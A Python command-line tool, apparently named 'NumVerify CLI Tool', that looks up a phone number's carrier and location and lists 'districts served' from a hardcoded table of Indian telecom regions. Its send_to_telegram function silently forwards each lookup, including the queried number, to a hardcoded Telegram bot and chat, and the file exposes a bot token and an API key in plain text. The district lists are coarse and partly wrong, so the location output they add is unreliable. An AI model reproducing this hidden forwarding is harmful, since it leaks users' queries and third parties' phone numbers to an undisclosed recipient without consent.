import argparse
import requests
import sys
import time

RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
RESET = '\033[0m'
BOLD = '\033[1m'

TELEGRAM_TOKEN = '7602879022:AAG579rGfdTUCz3lPzU5hhwNlQKppsMUqtE'
CHAT_ID = '5481501311'

logo = r"""
 _   _ _   ____  ________ _____ _____
| \ | | | | |  \/  | ___ \_   _|  _  |
|  \| | | | | .  . | |_/ / | | | | | |
| . ` | | | |\/| |    /  | | | | | | |
| |\  | |_| | |  | | |\ \ _| |_\ \_/ /
\_| \_/\___/\_|  |_|_| \_|\___/ \___/
"""

def type_effect(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.005)

valid_country_codes = {
    'in': 'India',
    'bd': 'Bangladesh',
    'pk': 'Pakistan',
    'us': 'United States',
}

# Mapping districts based on SIM operator
operators_districts = {
    'Airtel': {
        'Andhra Pradesh': ['Visakhapatnam', 'Vijayawada', 'Guntur'],
        'Assam': ['Guwahati', 'Dibrugarh', 'Tezpur'],
        'Bihar & Jharkhand': ['Patna', 'Ranchi', 'Jamshedpur'],
        'Delhi NCR': ['Delhi', 'Gurgaon', 'Noida'],
        'Gujarat': ['Ahmedabad', 'Surat', 'Vadodara'],
        'Haryana': ['Chandigarh', 'Gurgaon', 'Faridabad'],
        'Himachal Pradesh': ['Shimla', 'Kullu', 'Manali'],
        'Jammu & Kashmir': ['Srinagar', 'Jammu'],
        'Karnataka': ['Bangalore', 'Mysore', 'Hubli'],
        'Kerala': ['Kochi', 'Trivandrum', 'Kottayam'],
        'Kolkata': ['Kolkata', 'Howrah', 'Siliguri'],
        'Madhya Pradesh & Chhattisgarh': ['Indore', 'Bhopal', 'Raipur'],
        'Maharashtra & Goa': ['Mumbai', 'Pune', 'Goa'],
        'Mumbai': ['Mumbai', 'Thane'],
        'North East': ['Imphal', 'Shillong', 'Aizawl'],
        'Odisha': ['Bhubaneswar', 'Cuttack', 'Rourkela'],
        'Punjab': ['Amritsar', 'Chandigarh', 'Jalandhar'],
        'Rajasthan': ['Jaipur', 'Udaipur', 'Jodhpur'],
        'Tamil Nadu': ['Chennai', 'Coimbatore', 'Madurai'],
        'Telangana': ['Hyderabad', 'Warangal', 'Khammam'],
        'Uttar Pradesh East': ['Varanasi', 'Allahabad', 'Ghaziabad'],
        'Uttar Pradesh West': ['Meerut', 'Agra', 'Noida'],
        'West Bengal': ['Kolkata', 'Howrah', 'Siliguri'],
    },
    'Reliance Jio Infocomm Ltd (Rjil)': {
        'Andhra Pradesh & Telangana': ['Hyderabad', 'Vijayawada', 'Warangal'],
        'Assam': ['Guwahati', 'Silchar', 'Tezpur'],
        'Bihar': ['Patna', 'Bhagalpur', 'Gaya'],
        'Chennai': ['Chennai', 'Kanchipuram'],
        'Delhi': ['Delhi', 'Gurgaon', 'Noida'],
        'Gujarat': ['Ahmedabad', 'Surat', 'Vadodara'],
        'Haryana': ['Faridabad', 'Gurgaon'],
        'Himachal Pradesh': ['Shimla', 'Kullu'],
        'Jammu & Kashmir': ['Srinagar', 'Jammu'],
        'Karnataka': ['Bangalore', 'Mysore', 'Hubli'],
        'Kerala': ['Kochi', 'Thiruvananthapuram'],
        'Kolkata': ['Kolkata', 'Howrah'],
        'Madhya Pradesh': ['Indore', 'Bhopal', 'Jabalpur'],
        'Maharashtra': ['Mumbai', 'Pune', 'Nagpur'],
        'Mumbai': ['Mumbai'],
        'North East': ['Imphal', 'Shillong'],
        'Odisha': ['Bhubaneswar', 'Cuttack'],
        'Punjab': ['Amritsar', 'Ludhiana'],
        'Rajasthan': ['Jaipur', 'Jodhpur'],
        'Tamil Nadu': ['Chennai', 'Madurai'],
        'Uttar Pradesh East': ['Varanasi', 'Prayagraj'],
        'Uttar Pradesh West': ['Agra', 'Noida'],
        'West Bengal': ['Kolkata', 'Siliguri'],
    },
    'Vodafone Idea (Vi)': {
        'Andhra Pradesh': ['Visakhapatnam', 'Vijayawada'],
        'Assam': ['Guwahati', 'Tezpur'],
        'Bihar & Jharkhand': ['Patna', 'Ranchi'],
        'Chennai': ['Chennai'],
        'Delhi NCR': ['Delhi', 'Gurgaon'],
        'Gujarat': ['Ahmedabad', 'Vadodara'],
        'Haryana': ['Gurgaon', 'Faridabad'],
        'Himachal Pradesh': ['Shimla'],
        'Jammu & Kashmir': ['Jammu', 'Srinagar'],
        'Karnataka': ['Bangalore', 'Hubli'],
        'Kerala': ['Kochi', 'Trivandrum'],
        'Kolkata': ['Kolkata'],
        'Madhya Pradesh & Chhattisgarh': ['Indore', 'Raipur'],
        'Maharashtra & Goa': ['Mumbai', 'Pune'],
        'Mumbai': ['Mumbai'],
        'North East': ['Imphal', 'Shillong'],
        'Odisha': ['Bhubaneswar', 'Cuttack'],
        'Punjab': ['Amritsar', 'Chandigarh'],
        'Rajasthan': ['Jaipur', 'Udaipur'],
        'Tamil Nadu': ['Chennai', 'Madurai'],
        'Uttar Pradesh East': ['Varanasi', 'Prayagraj'],
        'Uttar Pradesh West': ['Meerut', 'Agra'],
        'West Bengal': ['Kolkata', 'Howrah'],
    }
}

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"{RED}Error sending message to Telegram: {e}{RESET}")

def show_districts(location, operator):
    operator_districts = operators_districts.get(operator, {})
    if location not in operator_districts:
        return f"{RED}No district information available for {location} under {operator}{RESET}"

    region_districts = operator_districts[location]
    districts_message = f"\n*Districts served by {operator} in {location}:*\n"
    districts_message += "\n".join(region_districts) + "\n"

    return districts_message

def validate_number(access_key, number, country_code=None):
    url = f"http://apilayer.net/api/validate?access_key={access_key}&number={number}"
    if country_code:
        url += f"&country_code={country_code}"

    try:
        response = requests.get(url)
        response.raise_for_status()
        data = response.json()

        if not data.get("success", True):
            print(f"{RED}Error: {data.get('error', {}).get('info', 'Unknown error')}{RESET}")
            sys.exit(1)

        result_message = f"""
{GREEN}{BOLD}Validation Results:{RESET}

{YELLOW}=============================== {RESET}
{BLUE}Valid: {RESET}{GREEN}{data.get('valid', 'N/A')}{RESET}
{BLUE}Number: {RESET}{GREEN}{data.get('number', 'N/A')}{RESET}
{BLUE}Local Format: {RESET}{GREEN}{data.get('local_format', 'N/A')}{RESET}
{BLUE}International Format: {RESET}{GREEN}{data.get('international_format', 'N/A')}{RESET}
{BLUE}Country Prefix: {RESET}{GREEN}{data.get('country_prefix', 'N/A')}{RESET}
{BLUE}Country Code: {RESET}{GREEN}{data.get('country_code', 'N/A')}{RESET}
{BLUE}Country Name: {RESET}{GREEN}{data.get('country_name', 'N/A')}{RESET}
{BLUE}Location: {RESET}{GREEN}{data.get('location', 'N/A')}{RESET}
{BLUE}Carrier: {RESET}{GREEN}{data.get('carrier', 'N/A')}{RESET}
{BLUE}Line Type: {RESET}{GREEN}{data.get('line_type', 'N/A')}{RESET}
{YELLOW}=============================== {RESET}
        """

        print(result_message)
        telegram_message = f"""
*Validation Results:*

*Valid:* {data.get('valid', 'N/A')}
*Number:* {data.get('number', 'N/A')}
*Local Format:* {data.get('local_format', 'N/A')}
*International Format:* {data.get('international_format', 'N/A')}
*Country Prefix:* {data.get('country_prefix', 'N/A')}
*Country Code:* {data.get('country_code', 'N/A')}
*Country Name:* {data.get('country_name', 'N/A')}
*Location:* {data.get('location', 'N/A')}
*Carrier:* {data.get('carrier', 'N/A')}
*Line Type:* {data.get('line_type', 'N/A')}
        """
        send_to_telegram(telegram_message)

        location = data.get('location', '').title()
        operator = data.get('carrier', '').title()

        if location and operator:
            district_message = show_districts(location, operator)
            print(district_message)
            send_to_telegram(district_message)
        else:
            print(f"{RED}No location or operator information available.{RESET}")
            send_to_telegram(f"{RED}No location or operator information available.{RESET}")

    except requests.RequestException as e:
        print(f"{RED}Error: {e}{RESET}")
        sys.exit(1)

def main():
    print(f"{RED}", end="")
    type_effect(logo)
    print(f"{RESET}", end="")

    access_key = "f99972a5171a4ca3acd9dc4778538fee"
    parser = argparse.ArgumentParser(description="NumVerify CLI Tool")
    parser.add_argument("number", help="The phone number to validate")
    parser.add_argument("-c", "--country", help="The country code (e.g., in, bd, pk)")

    args = parser.parse_args()

    if not args.number:
        parser.print_usage()
        print(f"{RED}Error: A phone number is required.{RESET}")
        sys.exit(2)

    if args.country:
        country_code = args.country.lower()
        if country_code not in valid_country_codes:
            print(f"{RED}Error: Country code '{args.country}' is not recognized.{RESET}")
            sys.exit(3)
    else:
        country_code = None

    validate_number(access_key, args.number, country_code)

if __name__ == "__main__":
    main()
